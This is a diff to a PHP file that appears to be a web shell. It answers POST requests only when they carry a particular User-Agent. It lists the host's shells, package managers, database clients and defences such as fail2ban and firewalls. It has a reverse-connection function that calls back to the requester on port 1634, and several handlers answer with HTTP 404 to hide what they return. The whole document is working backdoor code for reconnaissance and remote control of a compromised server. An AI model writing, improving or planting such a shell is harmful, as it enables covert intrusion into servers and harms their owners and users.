@@ -1,5 +1,5 @@
 <?php
-// leave me here.
+//leave me here!
 if ( ! defined( "PATH_SEPARATOR" ) ) {
     if (str_contains($_ENV["OS"], "Win") !== false)
         define( "PATH_SEPARATOR", ";" );
@@ -92,11 +92,12 @@ function checkComs(): array
         'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox',
         'qemu', 'sudo', "git", "xterm", "tcl", "ruby", "postgres", "mongo", "couchdb",
         "cron", "anacron", "visudo", "mail", "postfix", "gawk", "base64", "uuid", "pg_lsclusters",
-        "pg_ctlcluster", "pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool"
+        "pg_ctlcluster", "pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool",
+        "psql", "mysql", "sqlite3"
     );
     foreach ($lincommands as $item) {
-        $useful_commands[$item] = shell_exec(sloppyshell . " -c 'which {$item}'")
-            ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $useful_commands[$item] = shell_exec("which {$item} 2>/dev/null")
+            ?? "Disabled";
     }
     return $useful_commands;
 }
@@ -109,8 +110,8 @@ function parseProtections(): array
         "yast2", "fail2ban", "denyhost", "nftables", "firewall-cmd"
     );
     foreach ($protections as $prot) {
-        $prots[$prot] = shell_exec(sloppyshell . " -c 'which {$prot}'")
-            ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $prots[$prot] = shell_exec(" which {$prot} 2>/dev/null")
+            ?? "Disabled";
     }
     return $prots;
 }
@@ -127,8 +128,8 @@ function checkShells($os): array
         ]
     ];
     foreach ($shells[$os] as $shell) {
-        $usable_shells[$shell] = shell_exec(sloppyshell . " -c 'which {$shell}'")
-            ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $usable_shells[$shell] = shell_exec("which {$shell} 2>/dev/null")
+            ?? "Disabled";
     }
     return $usable_shells;
 }
@@ -138,11 +139,11 @@ function checkPack(): array
     $package_management = [];
     $packs = array(
         "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3",
-        "gem", "cargo", "nuget", "ant", "emerge", "go"
+        "gem", "cargo", "nuget", "ant", "emerge", "go", "rustup", "shards", "nimble"
     );
     foreach ($packs as $pack) {
-        $package_management[$pack] = shell_exec(sloppyshell . "-c 'which {$pack}'")
-            ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $package_management[$pack] = shell_exec("which {$pack} 2>/dev/null")
+            ?? "Disabled";
     }
     return $package_management;
 }
@@ -155,7 +156,7 @@ function reverseConnections($methods, $host, $port, $shell)
 {
     $defaultPort = 1634;
     $defaultHost = $_SERVER["REMOTE_ADDR"];
-    $defaultShell = shell_exec("which bash");
+    $defaultShell = shell_exec(sloppyshell);
 
     $useHost = null;
     $usePort = null;
@@ -311,16 +312,51 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
     if (!empty($_GET["qs"])) {
         switch ($_GET["qs"]) {
             case "cqP":
-                print_r(checkPack());
+                foreach (checkPack() as $packs => $isenabled){
+                    $isenabled = trim($isenabled);
+                    if ($isenabled === "Disabled"){
+                        $r = "\033[0;31m{$isenabled}\033[0m";
+                    }else {
+                        $r = "\033[0;36m{$isenabled}\033[0m";
+                    }
+                    echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $packs, trim($r));
+                    http_response_code(404);
+                }
                 break;
             case "cqPR":
-                print_r(parseProtections());
+                foreach (parseProtections() as $prots => $isenabled){
+                    $isenabled = trim($isenabled);
+                    if ($isenabled === "Disabled"){
+                        $r = "\033[0;31m{$isenabled}\033[0m";
+                    }else {
+                        $r = "\033[0;36m{$isenabled}\033[0m";
+                    }
+                    echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $prots, trim($r));
+                    http_response_code(404);
+                }
                 break;
             case "cqSH":
-                print_r(checkShells(slopos));
+                foreach (checkShells(slopos) as $shells => $isenabled){
+                    $isenabled = trim($isenabled);
+                    if ($isenabled === "Disabled"){
+                        $r = "\033[0;31m{$isenabled}\033[0m";
+                    }else {
+                        $r = "\033[0;36m{$isenabled}\033[0m";
+                    }
+                    echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $shells, trim($r));
+                    http_response_code(404);
+                }
                 break;
             case "cqCM":
-                print_r(checkComs());
+                foreach (checkComs() as $commands => $isenabled){
+                    $isenabled = trim($isenabled);
+                    if ($isenabled === "Disabled"){
+                        $r = "\033[0;31m{$isenabled}\033[0m";
+                    }else {
+                        $r = "\033[0;36m{$isenabled}\033[0m";
+                    }
+                    echo sprintf("\033[0;35m[%s]\033[0m => %s\n", $commands, trim($r));
+                }
                 break;
             case "cqI":
                 $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads"):"cannot set max_file_uploads";
